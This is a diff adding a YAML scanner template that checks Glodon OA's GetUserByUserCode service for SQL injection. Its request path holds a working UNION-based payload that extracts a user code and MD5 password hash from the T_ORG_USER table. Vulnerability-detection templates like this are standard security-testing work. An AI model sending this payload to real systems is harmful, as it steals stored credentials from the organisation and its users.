@@ -1,0 +1,10 @@
+name: 广联达OA-GetUserByUserCode-SQL
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /Org/service/Service.asmx/GetUserByUserCode?EncryptData=1&userCode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20top%201%20concat(F_CODE,%27:%27,F_PWD_MD5)%20from%20T_ORG_USER),NULL,NULL--+
+    expression:
+      body_all: ["&lt;User&gt;&lt;UserId&gt;&lt;/UserId&gt;&lt;UserName&gt;&lt;/UserName&"]
